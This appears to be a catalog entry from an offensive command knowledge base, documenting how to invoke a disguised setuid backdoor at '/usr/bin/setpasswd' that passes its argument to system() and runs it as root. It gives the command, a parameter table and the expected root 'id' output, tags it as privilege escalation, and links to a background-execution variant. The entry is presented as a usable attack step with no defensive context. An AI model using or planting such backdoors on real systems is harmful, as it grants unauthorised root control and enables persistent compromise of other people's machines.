---
id: cmd-009
data: /usr/bin/setpasswd 'id'
tags:
  - escalation
type: command
output: Output of 'id' showing uid=0(root)
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:58.197Z'
verified: false
validated: true
submitted: true
---
# setpasswd-id-execute

## Command

```bash
/usr/bin/setpasswd 'id'
```

## Description

Executes the setuid backdoor with 'id' to demonstrate root access after installation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| id | Command passed to system() | Yes |

## Examples

### Basic Usage

```bash
/usr/bin/setpasswd 'id'
```

## Expected Output

uid=0(root) gid=0(root).

## Related

- [[commands/setpasswd-id-background]]
